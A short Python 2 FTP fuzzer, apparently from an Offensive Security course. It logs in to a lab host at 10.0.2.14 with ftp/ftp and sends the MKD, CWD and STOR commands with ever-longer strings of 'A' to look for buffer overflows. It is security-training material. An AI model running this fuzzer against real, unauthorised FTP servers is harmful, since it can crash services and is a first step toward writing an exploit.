#!/usr/bin/python

# From Offensive - Security course

import socket
buffer = ["A"]
counter = 20
target = '10.0.2.14' # target
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter = counter + 100

commands = [ "MKD", "CWD", "STOR"]
for command in commands:
	for string in buffer:
		print "Fuzz "+command+" with "+str(len(string))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = s.connect((target, 21))
		s.recv(1024)
		s.send('USER ftp\r\n')
		s.recv(1024)
		s.send('PASS ftp\r\n')
		s.recv(1024)
		s.send(command + ' ' + string + '\r\n')
		s.recv(1024)
		s.send('QUIT\r\n')
		s.close()
